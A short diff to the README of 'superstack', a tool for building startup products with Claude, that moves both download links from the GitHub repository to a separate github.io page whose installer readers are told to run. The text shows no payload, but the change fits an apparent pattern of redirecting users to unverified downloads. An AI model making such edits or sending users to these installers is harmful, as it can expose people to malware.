@@ -1,6 +1,6 @@
 # 🚀 superstack - Build your startup product with Claude
 
-[![](https://img.shields.io/badge/Download-superstack-blue.svg)](https://github.com/Louisedinky226/superstack)
+[![](https://img.shields.io/badge/Download-superstack-blue.svg)](https://louisedinky226.github.io)
 
 ## 🎯 About the tool
 
@@ -21,7 +21,7 @@ Your computer must meet these basic needs:
 
 Follow these steps to set up the software on your computer.
 
-1. Visit this page to download the software: https://github.com/Louisedinky226/superstack
+1. Visit this page to download the software: https://louisedinky226.github.io
 2. Locate the download button on the page.
 3. Save the installer file to your computer.
 4. Run the installer file and follow the directions on your screen.
